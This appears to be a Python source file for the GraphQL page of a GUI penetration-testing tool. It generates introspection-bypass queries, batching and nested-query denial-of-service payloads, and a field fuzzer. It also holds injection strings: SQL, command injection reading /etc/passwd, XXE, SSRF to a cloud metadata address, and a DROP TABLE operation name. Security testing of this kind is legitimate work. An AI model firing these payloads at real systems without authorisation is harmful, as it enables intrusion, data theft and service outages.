"""
GraphqlPage — comprehensive GraphQL API security testing workbench.

Covers: introspection & bypass, batch attacks, DoS generators, field fuzzing,
injection probes (SQL/NoSQL/SSRF/Cmd/Template/LDAP/XXE), misc attacks, and
schema browsing.  All requests go through the AWE proxy so they are logged.
"""
from __future__ import annotations

import json
import logging
import urllib.parse
from pathlib import Path

import httpx
from PySide6.QtCore import Qt, QThread, QTimer, Signal
from PySide6.QtGui import QFont
from PySide6.QtWidgets import (
    QAbstractItemView, QApplication, QFileDialog, QFrame, QHBoxLayout,
    QLabel, QLineEdit, QMenu, QPushButton, QScrollArea, QSplitter,
    QSpinBox, QTabWidget, QTextEdit, QTreeWidget, QTreeWidgetItem,
    QVBoxLayout, QWidget,
)

from gui.guiUtilities import SyntaxHighlighter

log = logging.getLogger(__name__)


# ── colour / style constants ──────────────────────────────────────────────────

_BG       = "#11111B"
_SURFACE  = "#1E1E2E"
_SURFACE2 = "#181825"
_TEXT     = "#CDD6F4"
_SUBTEXT  = "#6C7086"
_BORDER   = "#313244"
_OVERLAY  = "#45475A"
_BLUE     = "#89B4FA"
_GREEN    = "#A6E3A1"
_TEAL     = "#94E2D5"
_PEACH    = "#FAB387"
_RED      = "#F38BA8"
_YELLOW   = "#F9E2AF"
_PURPLE   = "#CBA6F7"

_BTN = (
    "QPushButton{background:#313244;color:#CDD6F4;border:1px solid #45475A;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;}"
    "QPushButton:hover{background:#45475A;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_BTN_GREEN = (
    "QPushButton{background:#1E3A2F;color:#A6E3A1;border:1px solid #A6E3A1;"
    "border-radius:4px;padding:0 12px;min-height:24px;font-size:10px;font-weight:bold;}"
    "QPushButton:hover{background:#2A4A3F;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_BTN_TEAL = (
    "QPushButton{background:#162828;color:#94E2D5;border:1px solid #94E2D5;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;}"
    "QPushButton:hover{background:#1E3838;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_BTN_RED = (
    "QPushButton{background:#2D1420;color:#F38BA8;border:1px solid #F38BA8;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;}"
    "QPushButton:hover{background:#3D1A2E;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_BTN_PEACH = (
    "QPushButton{background:#2D1A0A;color:#FAB387;border:1px solid #FAB387;"
    "border-radius:4px;padding:0 10px;min-height:24px;font-size:9px;}"
    "QPushButton:hover{background:#3D2A1A;}"
    "QPushButton:disabled{background:#181825;color:#45475A;border-color:#313244;}"
)
_EDIT = (
    "QTextEdit{background:#11111B;color:#CDD6F4;border:none;padding:8px;"
    "font-family:'Cascadia Code',monospace;font-size:9px;}"
)
_LINE = (
    "QLineEdit{background:#11111B;color:#CDD6F4;border:1px solid #45475A;"
    "border-radius:4px;padding:0 6px;min-height:24px;font-size:9px;}"
    "QLineEdit:focus{border-color:#89B4FA;}"
)
_SPIN = (
    "QSpinBox{background:#11111B;color:#CDD6F4;border:1px solid #45475A;"
    "border-radius:4px;padding:0 4px;min-height:24px;font-size:9px;}"
)


# ── GraphQL attack payloads ───────────────────────────────────────────────────

def _probe_query() -> str:
    return "{__schema{queryType{name}}}"


def _full_introspection_query() -> str:
    return """query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name description locations
      args { ...InputValue }
    }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name description isDeprecated deprecationReason
  }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name description
  type { ...TypeRef }
  defaultValue
}
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType {
    kind name ofType { kind name ofType { kind name ofType {
      kind name ofType { kind name }
    }}}
  }}}
}"""


def _bypass_fragment() -> str:
    """Introspection via fragment spread — bypasses some blocklists."""
    return ("fragment SchemaFields on Query { __schema { types { name } } }\n"
            "{ ...SchemaFields }")


def _bypass_alias() -> str:
    """Introspection via field alias."""
    return "{ s: __schema { types { name kind description } } }"


def _array_batch(query: str, n: int) -> str:
    """GraphQL array-batch payload — [{"query": q}, …] × n."""
    item = {"query": query.strip()}
    return json.dumps([item] * n, indent=2)


def _alias_batch(field: str, n: int) -> str:
    """Alias-batch: {a1: field {id} a2: field {id} …}"""
    parts = [f"a{i}: {field} {{ id }}" for i in range(1, n + 1)]
    return "{\n  " + "\n  ".join(parts) + "\n}"


def _fragment_batch(field: str, n: int) -> str:
    """Fragment-reuse batch — spreads same fragment N times."""
    frag = f"fragment F on Query {{ {field} {{ id }} }}"
    spreads = "\n  ".join(f"...F" for _ in range(n))
    return f"{frag}\n{{\n  {spreads}\n}}"


def _deep_query(root: str, depth: int) -> str:
    """Generate a deeply nested query to depth N (DoS)."""
    root = root.strip() or "user"
    inner = "id"
    for _ in range(depth - 1):
        inner = f"{root} {{ {inner} }}"
    return "query DeepQuery {\n  " + root + " { " + inner + " }\n}"


def _wide_query(root: str, n: int) -> str:
    """Generate a query with N aliased copies of root field (width DoS)."""
    root = root.strip() or "user"
    parts = [f"a{i}: {root} {{ id }}" for i in range(1, n + 1)]
    return "query WideQuery {\n  " + "\n  ".join(parts) + "\n}"


def _recursive_fragment() -> str:
    """Circular fragment reference (spec-illegal; tests server parser)."""
    return ("# Fragment A references B which references A — server should reject\n"
            "fragment A on SomeType { ...B }\n"
            "fragment B on SomeType { ...A }\n"
            "{ someField { ...A } }")


def _injection_payload(field: str, arg: str, kind: str) -> str:
    """Return a GraphQL query with an injection payload in field(arg: <payload>)."""
    field = field.strip() or "search"
    arg   = arg.strip()   or "query"
    payloads = {
        "sql":      f"' OR 1=1--",
        "nosql":    f'{"$regex": ".*", "$options": "i"}',
        "ssrf":     f"http://169.254.169.254/latest/meta-data/",
        "cmd":      f"; id; cat /etc/passwd",
        "template": f"${{7*7}}",
        "ldap":     f"*)(uid=*))(|(uid=*",
        "xxe":      f'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
    }
    val = payloads.get(kind, "TEST")
    return f'query InjectTest {{\n  {field}({arg}: "{val}") {{\n    id\n  }}\n}}'


def _typename_probe() -> str:
    return "{ __typename }"


def _deprecated_fields_query() -> str:
    return """{ __schema {
  types {
    name
    fields(includeDeprecated: true) {
      name isDeprecated deprecationReason
    }
  }
}}"""


def _op_name_injection(base_query: str, name: str) -> str:
    """Inject a potentially malicious operation name."""
    name = name.strip() or "'; DROP TABLE users--"
    lines = base_query.strip().splitlines()
    if lines and lines[0].startswith("query"):
        lines[0] = f"query {name}"
        return "\n".join(lines)
    return f"query {name} {{\n  {base_query.strip()}\n}}"


def _type_confusion_query(field: str, arg: str) -> str:
    """Send wrong variable type (string instead of Int, etc.)."""
    field = field.strip() or "user"
    arg   = arg.strip()   or "id"
    return (f'query TypeConfusion($val: String) {{\n'
            f'  {field}({arg}: $val) {{\n    id\n  }}\n}}')


def _null_auth_note() -> str:
    """Return a reminder string about null token attack."""
    return "# Null-token attack: remove the Authorization header when sending the query."


def _populate_schema_tree(tree: QTreeWidget, schema_json: dict) -> None:
    """Fill tree from an introspection JSON `data.__schema` object."""
    tree.clear()
    try:
        schema = schema_json.get("data", {}).get("__schema", {})
    except Exception:
        return

    query_type = (schema.get("queryType") or {}).get("name", "")
    mut_type   = (schema.get("mutationType") or {}).get("name", "")
    sub_type   = (schema.get("subscriptionType") or {}).get("name", "")
    all_types  = {t["name"]: t for t in (schema.get("types") or []) if t.get("name")}

    roots = [
        ("Queries",       query_type,   _TEAL),
        ("Mutations",     mut_type,     _PEACH),
        ("Subscriptions", sub_type,     _PURPLE),
    ]

    for root_label, type_name, color in roots:
        root_item = QTreeWidgetItem([root_label])
        root_item.setForeground(0, __import__("PySide6.QtGui", fromlist=["QColor"]).QColor(color))
        f = root_item.font(0)
        f.setBold(True)
        root_item.setFont(0, f)
        tree.addTopLevelItem(root_item)
        if type_name and type_name in all_types:
            for field in (all_types[type_name].get("fields") or []):
                fn   = field.get("name", "?")
                args = field.get("args") or []
                ret  = _type_str(field.get("type", {}))
                arg_str = ", ".join(f"{a['name']}: {_type_str(a.get('type',{}))}" for a in args)
                label = f"{fn}({arg_str}): {ret}" if arg_str else f"{fn}: {ret}"
                child = QTreeWidgetItem([label])
                child.setForeground(0, __import__("PySide6.QtGui", fromlist=["QColor"]).QColor(_TEXT))
                if field.get("isDeprecated"):
                    child.setForeground(0, __import__("PySide6.QtGui", fromlist=["QColor"]).QColor(_SUBTEXT))
                    child.setToolTip(0, field.get("deprecationReason") or "Deprecated")
                root_item.addChild(child)
        root_item.setExpanded(True)

    # All named types (excluding built-ins and operation roots)
    skip = {"String", "Int", "Float", "Boolean", "ID", "__Schema", "__Type",
            "__Field", "__InputValue", "__EnumValue", "__Directive",
            "__DirectiveLocation", query_type, mut_type, sub_type}
    types_root = QTreeWidgetItem(["Types"])
    types_root.setForeground(0, __import__("PySide6.QtGui", fromlist=["QColor"]).QColor(_BLUE))
    f = types_root.font(0)
    f.setBold(True)
    types_root.setFont(0, f)
    tree.addTopLevelItem(types_root)
    for name, tdef in sorted(all_types.items()):
        if name in skip or name.startswith("__"):
            continue
        kind = tdef.get("kind", "")
        child = QTreeWidgetItem([f"{name}  [{kind}]"])
        child.setForeground(0, __import__("PySide6.QtGui", fromlist=["QColor"]).QColor(_TEXT))
        for field in (tdef.get("fields") or []):
            fn  = field.get("name", "?")
            ret = _type_str(field.get("type", {}))
            gc  = QTreeWidgetItem([f"{fn}: {ret}"])
            gc.setForeground(0, __import__("PySide6.QtGui", fromlist=["QColor"]).QColor(_SUBTEXT))
            child.addChild(gc)
        types_root.addChild(child)


def _type_str(t: dict, depth: int = 0) -> str:
    if not t or depth > 6:
        return "?"
    kind = t.get("kind", "")
    name = t.get("name", "")
    if kind == "NON_NULL":
        return _type_str(t.get("ofType", {}), depth + 1) + "!"
    if kind == "LIST":
        return "[" + _type_str(t.get("ofType", {}), depth + 1) + "]"
    return name or "?"


# ── background workers ────────────────────────────────────────────────────────

class _GraphqlWorker(QThread):
    result = Signal(str)
    error  = Signal(str)
    done   = Signal()

    def __init__(self, endpoint: str, query: str, variables: str,
                 extra_headers: list[list[str]], proxy_port: int,
                 as_get: bool = False, form_post: bool = False,
                 raw_body: str = "") -> None:
        super().__init__()
        self._endpoint      = endpoint
        self._query         = query
        self._variables     = variables
        self._extra_headers = extra_headers
        self._proxy_port    = proxy_port
        self._as_get        = as_get
        self._form_post     = form_post
        self._raw_body      = raw_body

    def run(self) -> None:
        try:
            proxy = f"http://127.0.0.1:{self._proxy_port}"
            hdrs  = {}
            for pair in (self._extra_headers or []):
                if len(pair) == 2 and pair[0].strip():
                    hdrs[pair[0].strip()] = pair[1]

            with httpx.Client(proxy=proxy, verify=False,
                              follow_redirects=True, timeout=30.0) as client:
                if self._as_get:
                    params = {"query": self._query}
                    if self._variables.strip():
                        params["variables"] = self._variables.strip()
                    resp = client.get(self._endpoint, headers=hdrs, params=params)
                elif self._form_post:
                    hdrs.setdefault("Content-Type", "application/x-www-form-urlencoded")
                    data = {"query": self._query}
                    if self._variables.strip():
                        data["variables"] = self._variables.strip()
                    resp = client.post(self._endpoint, headers=hdrs, data=data)
                elif self._raw_body:
                    hdrs.setdefault("Content-Type", "application/json")
                    resp = client.post(self._endpoint, headers=hdrs,
                                       content=self._raw_body.encode())
                else:
                    hdrs.setdefault("Content-Type", "application/json")
                    payload: dict = {"query": self._query}
                    try:
                        v = json.loads(self._variables) if self._variables.strip() else None
                        if v:
                            payload["variables"] = v
                    except Exception:
                        pass
                    resp = client.post(self._endpoint, headers=hdrs,
                                       content=json.dumps(payload).encode())

            try:
                pretty = json.dumps(resp.json(), indent=2)
            except Exception:
                pretty = resp.text
            self.result.emit(pretty)
        except Exception as exc:
            self.error.emit(str(exc))
        finally:
            self.done.emit()


class _FieldFuzzWorker(QThread):
    found    = Signal(str, str)   # (field_name, evidence_snippet)
    progress = Signal(str)
    done     = Signal()

    _STOP = False

    def __init__(self, endpoint: str, type_name: str, wordlist_path: str,
                 extra_headers: list[list[str]], proxy_port: int) -> None:
        super().__init__()
        self._endpoint      = endpoint
        self._type_name     = type_name or "Query"
        self._wordlist_path = wordlist_path
        self._extra_headers = extra_headers
        self._proxy_port    = proxy_port
        self._stop          = False

    def stop(self) -> None:
        self._stop = True

    def run(self) -> None:
        proxy = f"http://127.0.0.1:{self._proxy_port}"
        hdrs  = {"Content-Type": "application/json"}
        for pair in (self._extra_headers or []):
            if len(pair) == 2 and pair[0].strip():
                hdrs[pair[0].strip()] = pair[1]

        try:
            words = Path(self._wordlist_path).read_text(errors="replace").splitlines()
        except Exception as exc:
            self.progress.emit(f"[!] Cannot read wordlist: {exc}")
            self.done.emit()
            return

        total = len(words)
        self.progress.emit(f"Fuzzing {total} words on type '{self._type_name}'…")

        with httpx.Client(proxy=proxy, verify=False,
                          follow_redirects=True, timeout=15.0) as client:
            for i, word in enumerate(words):
                if self._stop:
                    break
                word = word.strip()
                if not word or word.startswith("#"):
                    continue
                q = f"{{ {word} }}"
                payload = json.dumps({"query": q}).encode()
                try:
                    resp = client.post(self._endpoint, headers=hdrs, content=payload)
                    body = resp.text
                except Exception:
                    continue

                if (i + 1) % 50 == 0:
                    self.progress.emit(f"[{i+1}/{total}]  testing: {word}")

                # "Did you mean" = server is hinting, field is close
                # No "Cannot query field" = field might exist
                if "Cannot query field" not in body:
                    snippet = body[:120].replace("\n", " ")
                    self.found.emit(word, snippet)
                elif "Did you mean" in body:
                    snippet = body[:120].replace("\n", " ")
                    self.found.emit(f"{word} [hint]", snippet)

        self.done.emit()


# ── UI helpers ────────────────────────────────────────────────────────────────

def _sep() -> QFrame:
    f = QFrame()
    f.setFrameShape(QFrame.HLine)
    f.setFixedHeight(1)
    f.setStyleSheet(f"background:{_BORDER}; border:none;")
    return f


def _sec_lbl(text: str, color: str = _SUBTEXT) -> QLabel:
    lbl = QLabel(f"── {text} {'─' * max(0, 28 - len(text))}")
    lbl.setStyleSheet(
        f"color:{color}; font-size:8px; font-weight:bold; "
        f"background:{_SURFACE2}; padding:3px 6px;"
    )
    return lbl


def _btn(label: str, style: str = _BTN, height: int = 26) -> QPushButton:
    b = QPushButton(label)
    b.setFixedHeight(height)
    b.setStyleSheet(style)
    return b


def _row(*widgets) -> QHBoxLayout:
    lay = QHBoxLayout()
    lay.setContentsMargins(6, 2, 6, 2)
    lay.setSpacing(6)
    for w in widgets:
        if isinstance(w, QWidget):
            lay.addWidget(w)
        elif w == "stretch":
            lay.addStretch()
    return lay


# ── main page ─────────────────────────────────────────────────────────────────

class GraphqlPage(QWidget):
    """GraphQL security testing workbench."""

    send_to_repeater = Signal(str)

    def __init__(self, repository=None, proxy_port: int = 8080, parent=None) -> None:
        super().__init__(parent)
        self._repo        = repository
        self._proxy_port  = proxy_port
        self._worker: _GraphqlWorker | None = None
        self._fuzz_worker: _FieldFuzzWorker | None = None
        self._extra_headers: list[list[str]] = []
        self._wordlist_path = ""
        self._last_schema_json: dict = {}

        self._build_ui()

        self._save_timer = QTimer(self)
        self._save_timer.setSingleShot(True)
        self._save_timer.setInterval(1500)
        self._save_timer.timeout.connect(self._save_state)

        self._endpoint_input.textChanged.connect(self._save_timer.start)
        self._query_edit.textChanged.connect(self._save_timer.start)
        self._vars_edit.textChanged.connect(self._save_timer.start)

        self._restore_state()

    # ── public API ────────────────────────────────────────────────────────────

    def load_request(self, raw_http: str) -> None:
        """Parse a raw HTTP request block and populate endpoint, headers, query."""
        lines = raw_http.replace("\r\n", "\n").split("\n")
        if not lines:
            return

        # Extract Host and path from first line + headers
        host   = ""
        path   = "/"
        scheme = "https"
        body_lines: list[str] = []
        in_body = False
        skip_headers = {"content-length", "transfer-encoding", "connection",
                        "proxy-connection", "keep-alive"}
        new_hdrs: list[list[str]] = []

        parts = lines[0].strip().split(" ", 2)
        if len(parts) >= 2:
            path = parts[1]

        for line in lines[1:]:
            if in_body:
                body_lines.append(line)
                continue
            if not line.strip():
                in_body = True
                continue
            if ":" in line:
                k, _, v = line.partition(":")
                k = k.strip()
                vv = v.strip()
                kl = k.lower()
                if kl == "host":
                    host = vv
                elif kl not in skip_headers:
                    new_hdrs.append([k, vv])

        if host:
            port_str = host.split(":")[-1] if ":" in host else ""
            scheme   = "http" if port_str in {"80", "8080", "8000", "8888"} else "https"
            endpoint = f"{scheme}://{host}{path}"
            self._endpoint_input.setText(endpoint)

        if new_hdrs:
            self._extra_headers = new_hdrs

        # Extract query from JSON body
        body_text = "\n".join(body_lines).strip()
        if body_text:
            try:
                body_json = json.loads(body_text)
                q = body_json.get("query", "")
                v = body_json.get("variables")
                if q:
                    self._query_edit.setPlainText(q)
                if v:
                    self._vars_edit.setPlainText(json.dumps(v, indent=2))
            except Exception:
                self._query_edit.setPlainText(body_text)

    def load_query(self, query: str) -> None:
        """Directly set the query editor content."""
        self._query_edit.setPlainText(query.strip())

    # ── persistence ───────────────────────────────────────────────────────────

    def _save_state(self) -> None:
        if not self._repo:
            return
        try:
            self._repo.save_page_state("graphql", {
                "endpoint":  self._endpoint_input.text(),
                "query":     self._query_edit.toPlainText(),
                "variables": self._vars_edit.toPlainText(),
                "headers":   self._extra_headers,
            })
        except Exception:
            pass

    def _restore_state(self) -> None:
        if not self._repo:
            return
        try:
            state = self._repo.load_page_state("graphql")
        except Exception:
            return
        if not state:
            return
        if state.get("endpoint"):
            self._endpoint_input.setText(state["endpoint"])
        if state.get("query"):
            self._query_edit.setPlainText(state["query"])
        if state.get("variables"):
            self._vars_edit.setPlainText(state["variables"])
        if state.get("headers"):
            self._extra_headers = state["headers"]

    # ── UI build ──────────────────────────────────────────────────────────────

    def _build_ui(self) -> None:
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        root.addWidget(self._build_toolbar())
        root.addWidget(_sep())

        splitter = QSplitter(Qt.Horizontal)
        splitter.setChildrenCollapsible(False)
        splitter.setStyleSheet(f"QSplitter::handle{{background:{_BORDER};width:3px;}}")
        splitter.addWidget(self._build_left_pane())
        splitter.addWidget(self._build_right_pane())
        splitter.setSizes([580, 320])

        root.addWidget(splitter, stretch=1)

    def _build_toolbar(self) -> QWidget:
        w = QWidget()
        w.setFixedHeight(40)
        w.setStyleSheet(f"background:{_SURFACE2};")
        lay = QHBoxLayout(w)
        lay.setContentsMargins(10, 6, 10, 6)
        lay.setSpacing(8)

        title = QLabel("⬡  GraphQL")
        title.setStyleSheet(f"color:{_TEAL}; font-weight:bold; font-size:11px;")
        lay.addWidget(title)

        ep_lbl = QLabel("Endpoint:")
        ep_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        lay.addWidget(ep_lbl)

        self._endpoint_input = QLineEdit()
        self._endpoint_input.setPlaceholderText("https://target.com/graphql")
        self._endpoint_input.setStyleSheet(_LINE)
        lay.addWidget(self._endpoint_input, stretch=1)

        hdr_btn = _btn("+ Headers", _BTN)
        hdr_btn.clicked.connect(self._on_add_headers)
        lay.addWidget(hdr_btn)

        clear_btn = _btn("Clear", _BTN)
        clear_btn.clicked.connect(self._on_clear)
        lay.addWidget(clear_btn)

        return w

    def _build_left_pane(self) -> QWidget:
        w = QWidget()
        w.setStyleSheet(f"background:{_BG};")
        lay = QVBoxLayout(w)
        lay.setContentsMargins(0, 0, 0, 0)
        lay.setSpacing(0)

        tabs = QTabWidget()
        tabs.setStyleSheet(
            "QTabBar::tab{background:#181825;color:#6C7086;padding:4px 14px;"
            "border:none;font-size:9px;}"
            "QTabBar::tab:selected{background:#11111B;color:#CDD6F4;"
            "border-bottom:2px solid #94E2D5;}"
            "QTabWidget::pane{border:none;}"
        )

        # ── Tab 1: Query ──────────────────────────────────────────────────────
        query_w = QWidget()
        query_w.setStyleSheet(f"background:{_BG};")
        ql = QVBoxLayout(query_w)
        ql.setContentsMargins(0, 0, 0, 0)
        ql.setSpacing(0)

        self._query_edit = QTextEdit()
        self._query_edit.setFont(QFont("Cascadia Code", 9))
        self._query_edit.setStyleSheet(_EDIT)
        self._query_edit.setPlaceholderText(
            "# Enter a GraphQL query here\nquery {\n  __typename\n}"
        )
        self._hl_query = SyntaxHighlighter(self._query_edit.document())
        ql.addWidget(self._query_edit, stretch=1)
        ql.addWidget(_sep())

        send_bar = QWidget()
        send_bar.setStyleSheet(f"background:{_SURFACE2};")
        sb = QHBoxLayout(send_bar)
        sb.setContentsMargins(8, 4, 8, 4)
        sb.setSpacing(8)
        self._send_btn = _btn("▶  Send Query", _BTN_GREEN)
        self._send_btn.clicked.connect(self._on_send_query)
        sb.addWidget(self._send_btn)
        self._send_status = QLabel("")
        self._send_status.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        sb.addWidget(self._send_status)
        sb.addStretch()
        rep_btn = _btn("→ Repeater", _BTN)
        rep_btn.setToolTip("Open query in Repeater as a raw HTTP POST")
        rep_btn.clicked.connect(self._on_send_to_repeater)
        sb.addWidget(rep_btn)
        ql.addWidget(send_bar)
        tabs.addTab(query_w, "Query")

        # ── Tab 2: Variables ──────────────────────────────────────────────────
        self._vars_edit = QTextEdit()
        self._vars_edit.setFont(QFont("Cascadia Code", 9))
        self._vars_edit.setStyleSheet(_EDIT)
        self._vars_edit.setPlaceholderText('{\n  "id": 1\n}')
        self._hl_vars = SyntaxHighlighter(self._vars_edit.document())
        tabs.addTab(self._vars_edit, "Variables")

        # ── Tab 3: Schema ─────────────────────────────────────────────────────
        self._schema_tree = QTreeWidget()
        self._schema_tree.setColumnCount(1)
        self._schema_tree.setHeaderHidden(True)
        self._schema_tree.setStyleSheet(
            f"QTreeWidget{{background:{_BG};color:{_TEXT};border:none;"
            f"font-family:'Cascadia Code',monospace;font-size:9px;}}"
            f"QTreeWidget::item:selected{{background:#313244;}}"
            f"QTreeWidget::item:hover{{background:#1E1E2E;}}"
        )
        self._schema_tree.setSelectionMode(QAbstractItemView.SingleSelection)
        self._schema_tree.setContextMenuPolicy(Qt.CustomContextMenu)
        self._schema_tree.customContextMenuRequested.connect(self._schema_ctx_menu)
        tabs.addTab(self._schema_tree, "Schema")

        # ── Tab 4: Response ───────────────────────────────────────────────────
        self._resp_edit = QTextEdit()
        self._resp_edit.setReadOnly(True)
        self._resp_edit.setFont(QFont("Cascadia Code", 9))
        self._resp_edit.setStyleSheet(_EDIT)
        self._hl_resp = SyntaxHighlighter(self._resp_edit.document())
        tabs.addTab(self._resp_edit, "Response")

        lay.addWidget(tabs, stretch=1)
        return w

    def _build_right_pane(self) -> QWidget:
        outer = QWidget()
        outer.setStyleSheet(f"background:{_SURFACE};")
        ol = QVBoxLayout(outer)
        ol.setContentsMargins(0, 0, 0, 0)
        ol.setSpacing(0)

        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setFrameShape(QFrame.NoFrame)
        scroll.setStyleSheet(
            f"QScrollArea{{background:{_SURFACE};border:none;}}"
            f"QScrollBar:vertical{{background:{_SURFACE};width:8px;}}"
            f"QScrollBar::handle:vertical{{background:{_OVERLAY};border-radius:4px;}}"
        )

        inner = QWidget()
        inner.setStyleSheet(f"background:{_SURFACE};")
        lay = QVBoxLayout(inner)
        lay.setContentsMargins(0, 4, 0, 4)
        lay.setSpacing(2)

        # ── INTROSPECTION ─────────────────────────────────────────────────────
        lay.addWidget(_sec_lbl("INTROSPECTION", _TEAL))

        row1 = QHBoxLayout()
        row1.setContentsMargins(6, 2, 6, 2)
        row1.setSpacing(6)
        probe_btn = _btn("Probe Enabled", _BTN_TEAL)
        probe_btn.setToolTip("Send {__schema{queryType{name}}} and report result")
        probe_btn.clicked.connect(self._on_probe)
        row1.addWidget(probe_btn)
        dump_btn = _btn("Full Schema Dump", _BTN_TEAL)
        dump_btn.setToolTip("Run the full introspection query and populate Schema tab")
        dump_btn.clicked.connect(self._on_full_dump)
        row1.addWidget(dump_btn)
        row1.addStretch()
        lay.addLayout(row1)

        row2 = QHBoxLayout()
        row2.setContentsMargins(6, 2, 6, 2)
        row2.setSpacing(6)
        bypass_lbl = QLabel("Bypass:")
        bypass_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row2.addWidget(bypass_lbl)
        for label, slot in [
            ("Fragment",  self._on_bypass_fragment),
            ("Alias",     self._on_bypass_alias),
            ("GET",       self._on_bypass_get),
            ("Form-POST", self._on_bypass_form),
        ]:
            b = _btn(label, _BTN)
            b.clicked.connect(slot)
            row2.addWidget(b)
        row2.addStretch()
        lay.addLayout(row2)

        lay.addWidget(_sep())

        # ── BATCH ATTACKS ─────────────────────────────────────────────────────
        lay.addWidget(_sec_lbl("BATCH ATTACKS", _PEACH))

        row3 = QHBoxLayout()
        row3.setContentsMargins(6, 2, 6, 2)
        row3.setSpacing(6)
        n_lbl = QLabel("N:")
        n_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row3.addWidget(n_lbl)
        self._batch_n = QSpinBox()
        self._batch_n.setRange(2, 500)
        self._batch_n.setValue(10)
        self._batch_n.setStyleSheet(_SPIN)
        self._batch_n.setFixedWidth(70)
        row3.addWidget(self._batch_n)
        for label, slot in [
            ("Array Batch",    self._on_array_batch),
            ("Alias Batch",    self._on_alias_batch),
            ("Fragment Batch", self._on_fragment_batch),
        ]:
            b = _btn(label, _BTN_PEACH)
            b.clicked.connect(slot)
            row3.addWidget(b)
        row3.addStretch()
        lay.addLayout(row3)

        lay.addWidget(_sep())

        # ── DoS GENERATOR ─────────────────────────────────────────────────────
        lay.addWidget(_sec_lbl("DoS GENERATOR", _RED))

        row4 = QHBoxLayout()
        row4.setContentsMargins(6, 2, 6, 2)
        row4.setSpacing(6)
        root_lbl = QLabel("Root field:")
        root_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row4.addWidget(root_lbl)
        self._dos_root = QLineEdit()
        self._dos_root.setPlaceholderText("e.g. user")
        self._dos_root.setStyleSheet(_LINE)
        self._dos_root.setFixedWidth(90)
        row4.addWidget(self._dos_root)
        row4.addStretch()
        lay.addLayout(row4)

        row5 = QHBoxLayout()
        row5.setContentsMargins(6, 2, 6, 2)
        row5.setSpacing(6)
        depth_lbl = QLabel("Depth:")
        depth_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row5.addWidget(depth_lbl)
        self._dos_depth = QSpinBox()
        self._dos_depth.setRange(2, 100)
        self._dos_depth.setValue(10)
        self._dos_depth.setStyleSheet(_SPIN)
        self._dos_depth.setFixedWidth(65)
        row5.addWidget(self._dos_depth)
        deep_btn = _btn("Deep Query", _BTN_RED)
        deep_btn.clicked.connect(self._on_deep_query)
        row5.addWidget(deep_btn)

        width_lbl = QLabel("Width:")
        width_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row5.addWidget(width_lbl)
        self._dos_width = QSpinBox()
        self._dos_width.setRange(2, 500)
        self._dos_width.setValue(50)
        self._dos_width.setStyleSheet(_SPIN)
        self._dos_width.setFixedWidth(65)
        row5.addWidget(self._dos_width)
        wide_btn = _btn("Wide Query", _BTN_RED)
        wide_btn.clicked.connect(self._on_wide_query)
        row5.addWidget(wide_btn)
        row5.addStretch()
        lay.addLayout(row5)

        row6 = QHBoxLayout()
        row6.setContentsMargins(6, 2, 6, 2)
        row6.setSpacing(6)
        rec_btn = _btn("Recursive Fragment", _BTN_RED)
        rec_btn.setToolTip("Generate a circular fragment reference payload")
        rec_btn.clicked.connect(self._on_recursive_frag)
        row6.addWidget(rec_btn)
        dep_btn = _btn("Deprecated Fields", _BTN)
        dep_btn.setToolTip("Query all fields including deprecated ones")
        dep_btn.clicked.connect(self._on_deprecated)
        row6.addWidget(dep_btn)
        row6.addStretch()
        lay.addLayout(row6)

        lay.addWidget(_sep())

        # ── FIELD FUZZING ─────────────────────────────────────────────────────
        lay.addWidget(_sec_lbl("FIELD FUZZING", _BLUE))

        row7 = QHBoxLayout()
        row7.setContentsMargins(6, 2, 6, 2)
        row7.setSpacing(6)
        type_lbl = QLabel("Type:")
        type_lbl.setStyleSheet(f"color:{_SUBTEXT}; font-size:9px;")
        row7.addWidget(type_lbl)
        self._fuzz_type = QLineEdit("Query")
        self._fuzz_type.setStyleSheet(_LINE)
        self._fuzz_type.setFixedWidth(100)
        row7.addWidget(self._fuzz_type)
        browse_btn = _btn("Browse Wordlist…", _BTN)
        browse_btn.clicked.connect(self._on_browse_wordlist)
        row7.addWidget(browse_btn)
        row7.addStretch()
        lay.addLayout(row7)

        self._wordlist_lbl = QLabel("No wordlist selected")
        self._wordlist_lbl.setStyleSheet(
            f"color:{_SUBTEXT}; font-size:8px; padding:0 8px;"
        )
        lay.addWidget(self._wordlist_lbl)

        row8 = QHBoxLayout()
        row8.setContentsMargins(6, 2, 6, 2)
        row8.setSpacing(6)
        self._fuzz_start_btn = _btn("▶  Start Fuzz", _BTN_GREEN)
        self._fuzz_start_btn.clicked.connect(self._on_start_fuzz)
        row8.addWidget(self._fuzz_start_btn)
        self._fuzz_stop_btn = _btn("■  Stop", _BTN_RED)
        self._fuzz_stop_btn.setEnabled(False)
        self._fuzz_stop_btn.clicked.connect(self._on_stop_fuzz)
        row8.addWidget(self._fuzz_stop_btn)
        self._fuzz_progress = QLabel("")
